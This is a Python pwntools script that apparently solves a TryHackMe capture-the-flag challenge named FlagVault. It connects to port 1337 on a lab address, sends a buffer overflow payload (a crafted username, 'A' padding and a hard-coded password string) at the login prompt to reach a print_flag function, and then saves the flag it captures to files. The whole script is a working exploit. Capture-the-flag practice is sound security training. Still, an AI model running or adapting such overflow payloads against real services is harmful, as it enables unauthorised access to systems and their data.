from pwn import *
import os

def solve_flagvault(task_name, target_ip):
    port = 1337
    log_dir = "logs"
    flags_dir = "flags"
    os.makedirs(log_dir, exist_ok=True)
    os.makedirs(flags_dir, exist_ok=True)

    log_path = os.path.join(log_dir, f"{task_name}.log")
    flag_path = os.path.join(flags_dir, f"{task_name}.flag")

    print(f"[*] Connecting to {target_ip}:{port}...")
    try:
        conn = remote(target_ip, port, timeout=10)
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        return None

    # Custom buffer overflow payload crafted to reach print_flag()
    payload = b"bytereaper\x00" + b"A" * 101 + b"5up3rP4zz123Byte"

    try:
        conn.recvuntil(b"Username:")
        conn.sendline(payload)
        output = conn.recvall(timeout=3).decode(errors='ignore')
    except EOFError:
        output = ""
    conn.close()

    print("[*] Server response:")
    print(output)

    if "THM{" in output:
        flag_start = output.find("THM{")
        flag = output[flag_start:].split()[0].strip()
        print(f"[+] Flag found: {flag}")

        with open(log_path, "w") as logf:
            logf.write(output)

        with open(flag_path, "w") as flagf:
            flagf.write(flag + "\n")

        return flag
    else:
        print("[-] Flag not found.")
        return None

# Manual test
if __name__ == "__main__":
    solve_flagvault("FlagVault", "10.10.10.10")
